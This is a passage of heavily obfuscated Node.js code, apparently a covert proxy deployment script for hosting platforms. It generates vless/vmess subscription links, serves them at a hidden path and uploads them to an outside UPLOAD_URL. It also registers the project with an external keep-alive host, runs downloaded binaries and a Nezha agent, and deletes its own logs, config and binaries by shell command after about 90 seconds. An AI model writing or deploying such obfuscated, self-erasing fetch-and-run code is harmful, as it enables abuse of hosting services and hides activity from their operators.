_0x49fa30={_0x48dab2:0xe6,_0x1892fe:0x111},_0x4d43eb=_0x5b2a,_0x45875d={'v':'2','ps':''+_0x50bc73,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4d43eb(_0x28e658._0x53b7a8),'net':'ws','type':_0x4d43eb(_0x28e658._0x594a90),'host':_0x40e5c8,'path':_0x4d43eb(_0x28e658._0x7975b2),'tls':_0x4d43eb(0xaa),'sni':_0x40e5c8,'alpn':'','fp':'firefox'},_0x3bbe46='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x4d43eb(_0x28e658._0x172d63)+_0x40e5c8+_0x4d43eb(0xb0)+_0x40e5c8+_0x4d43eb(0xe0)+_0x50bc73+_0x4d43eb(0x10b)+Buffer['from'](JSON[_0x4d43eb(0xfa)](_0x45875d))[_0x4d43eb(0x133)](_0x4d43eb(0xae))+_0x4d43eb(_0x28e658._0x4f4b6c)+UUID+'@'+CFIP+':'+CFPORT+_0x4d43eb(0xed)+_0x40e5c8+_0x4d43eb(_0x28e658._0x3b67b9)+_0x40e5c8+_0x4d43eb(_0x28e658._0x20ecbc)+_0x50bc73+_0x4d43eb(_0x28e658._0x46b80c);console[_0x4d43eb(0x107)](Buffer[_0x4d43eb(0xe6)](_0x3bbe46)[_0x4d43eb(0x133)](_0x4d43eb(_0x28e658._0x3035a4))),fs[_0x4d43eb(0x101)](subPath,Buffer[_0x4d43eb(0xe6)](_0x3bbe46)['toString'](_0x4d43eb(0xae))),console[_0x4d43eb(0x107)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x4d43eb(0xbc)]('/'+SUB_PATH,(_0x2168d7,_0x51556f)=>{const _0x248997=_0x4d43eb,_0x10e81a=Buffer[_0x248997(_0x49fa30._0x48dab2)](_0x3bbe46)[_0x248997(0x133)](_0x248997(0xae));_0x51556f[_0x248997(_0x49fa30._0x1892fe)](_0x248997(0x14f),_0x248997(0x116)),_0x51556f[_0x248997(0x152)](_0x10e81a);}),_0x5ecd43(_0x3bbe46);},0x7d0);});}}async function uploadNodes(){const _0x427ada={_0x50fab0:0xe8,_0x5efd7c:0x107,_0xfea3d7:0x145,_0x1397a8:0xff,_0x100157:0xb1,_0x522ecb:0x113,_0x151460:0x149,_0x13d203:0x130,_0x39bf6f:0xfa,_0x3b9c89:0xcd,_0x12023a:0x107},_0x28eaaa=_0x11fd1e;if(UPLOAD_URL&&PROJECT_URL){const _0x54d13a=PROJECT_URL+'/'+SUB_PATH,_0x14fbed={'subscription':[_0x54d13a]};try{const _0x226cc3=await axios[_0x28eaaa(_0x427ada._0x50fab0)](UPLOAD_URL+_0x28eaaa(0x131),_0x14fbed,{'headers':{'Content-Type':'application/json'}});return _0x226cc3&&_0x226cc3['status']===0xc8?(console[_0x28eaaa(_0x427ada._0x5efd7c)](_0x28eaaa(_0x427ada._0xfea3d7)),_0x226cc3):null;}catch(_0xb6bb51){if(_0xb6bb51[_0x28eaaa(_0x427ada._0x1397a8)]){if(_0xb6bb51[_0x28eaaa(0xff)][_0x28eaaa(_0x427ada._0x100157)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x28eaaa(0xf3)](listPath))return;const _0x589986=fs['readFileSync'](listPath,'utf-8'),_0x4926b8=_0x589986[_0x28eaaa(_0x427ada._0x522ecb)]('\x0a')[_0x28eaaa(_0x427ada._0x151460)](_0x372ad2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x28eaaa(0x10a)](_0x372ad2));if(_0x4926b8[_0x28eaaa(_0x427ada._0x13d203)]===0x0)return;const _0x42a820=JSON[_0x28eaaa(_0x427ada._0x39bf6f)]({'nodes':_0x4926b8});try{const _0x166c52=await axios[_0x28eaaa(_0x427ada._0x50fab0)](UPLOAD_URL+_0x28eaaa(_0x427ada._0x3b9c89),_0x42a820,{'headers':{'Content-Type':_0x28eaaa(0xf7)}});return _0x166c52&&_0x166c52['status']===0xc8?(console[_0x28eaaa(_0x427ada._0x12023a)](_0x28eaaa(0x108)),_0x166c52):null;}catch(_0x1df56a){return null;}}else return;}}function cleanFiles(){const _0x3231a3={_0x17b152:0xf6,_0x4fb69b:0xf0,_0x24218f:0xcb,_0xb913:0x137},_0x42951e={_0x21f4bd:0x11e};setTimeout(()=>{const _0x1cd0fd={_0x298f8a:0xd1,_0x2e0fc7:0xbe,_0x2a2d25:0x107,_0x5385b0:0x11e},_0x395a9d=_0x5b2a,_0x405a0c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x405a0c[_0x395a9d(0xb3)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x405a0c[_0x395a9d(0xb3)](phpPath);process[_0x395a9d(_0x3231a3._0x17b152)]===_0x395a9d(0x138)?exec(_0x395a9d(0x10e)+_0x405a0c['join']('\x20')+_0x395a9d(_0x3231a3._0x4fb69b),_0x17beb8=>{const _0x561c20=_0x395a9d;console[_0x561c20(0xd1)](),console['log'](_0x561c20(0xbe)),console[_0x561c20(0x107)](_0x561c20(_0x42951e._0x21f4bd));}):exec(_0x395a9d(0x140)+_0x405a0c[_0x395a9d(_0x3231a3._0x24218f)]('\x20')+_0x395a9d(_0x3231a3._0xb913),_0x53958c=>{const _0x438c64=_0x395a9d;console[_0x438c64(_0x1cd0fd._0x298f8a)](),console['log'](_0x438c64(_0x1cd0fd._0x2e0fc7)),console[_0x438c64(_0x1cd0fd._0x2a2d25)](_0x438c64(_0x1cd0fd._0x5385b0));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x964c98={_0x48b942:0x107,_0x7c6c46:0xcc,_0x3ddae3:0xe8},_0x421206=_0x11fd1e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x421206(_0x964c98._0x48b942)](_0x421206(_0x964c98._0x7c6c46));return;}try{const _0x69063c=await axios[_0x421206(_0x964c98._0x3ddae3)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x421206(0xf7)}});return console[_0x421206(0x107)]('automatic\x20access\x20task\x20added\x20successfully'),_0x69063c;}catch(_0xaf3d92){return console[_0x421206(0x156)](_0x421206(0x128)+_0xaf3d92[_0x421206(0x15b)]),null;}}async function startserver(){const _0x157a00=_0x11fd1e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x283783){console['error'](_0x157a00(0xb2),_0x283783);}}startserver()['catch'](_0x1e38cd=>{const _0x3077d0=_0x11fd1e;console[_0x3077d0(0x156)]('Unhandled\x20error\x20in\x20startserver:',_0x1e38cd);}),app[_0x11fd1e(0x13e)](PORT,()=>console[_0x11fd1e(0x107)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
